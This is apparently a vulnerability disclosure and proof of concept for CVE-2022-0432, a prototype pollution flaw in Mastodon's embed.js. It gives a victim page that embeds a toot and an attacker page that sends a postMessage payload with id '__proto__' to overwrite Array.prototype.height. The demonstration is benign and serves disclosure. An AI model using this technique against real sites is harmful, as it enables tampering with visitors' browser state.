https://nvd.nist.gov/vuln/detail/CVE-2022-0432

Vuln: Prototype Pollution

Original Finder: r0hanSH

---

## PoC

**STEP 1**: Victim user post toots on mastodon and embed his/her toots on his/her website using the following code (default):

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Victim's website</title>
</head>
<body>


    <div id='before'></div>
    <br>
    <div id='exploit-status'></div>
    <div id='after'></div>
    <div id='info'></div>


<script type="text/javascript">
    
    var sample = []; // Array
    document.getElementById("before").innerHTML = "var sample = [];<br><b>BEFORE</b> running the exploit, the value of sample.height = " + sample.height;

    document.getElementById("exploit-status").innerHTML = "[+] Running exploit..."
</script>

<iframe src="https://mas.to/@reo1212/107650549212219629/embed" class="mastodon-embed" style="max-width: 100%; border: 0" width="400" allowfullscreen="allowfullscreen"></iframe><script src="https://mas.to/embed.js" async="async"></script>


<script type="text/javascript">

    setTimeout(function(){

        document.getElementById("exploit-status").innerHTML = "[+] Finished"

        document.getElementById("after").innerHTML = "<b>AFTER</b> running the exploit, the value of sample.height = " + sample.height;

        document.getElementById("info").innerHTML = "To validate whether the exploit is working, please run the following in the console: \n<pre>var anything = [];\nconsole.log(anything.height);</pre> it will give you default value 100 which was set by my exploit";
    }, 6000);

</script>

</body>
</html>
```

**STEP 2**: Attacker host the following code on his/her website.

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
</head>
<body>

<p>
This exploit will create or overwrite the "height" property of "Array" object in the target browser window where "embed.js" is loaded by website.
</p>

<script>
    function exploit(){

    var target = 'http://localhost:8081/mastodon-test.html'; // CHANGE THIS VALUE

    var payload = JSON.parse('{"type": "setHeight", "id": "__proto__", "height": "100"}');
    
    window.poc = window.open(target);

    setTimeout(function(){
        window.poc.postMessage(
            payload,
            '*'
        );
    }, 4000);

}
</script>
<input type="button" onclick="exploit()" value="EXPLOIT">

</body>
</html>
```

**STEP 3**: Now, exploit the vulnerability by clicking the `EXPLOIT` button on attacker's website.
Now, create any array object and check the value of height property, it will be 100 as described by my exploit. video PoC will help here.

https://drive.google.com/file/d/1vpZ0CcmFhTEUasLTPUBf8o-4l7G6ojtG/view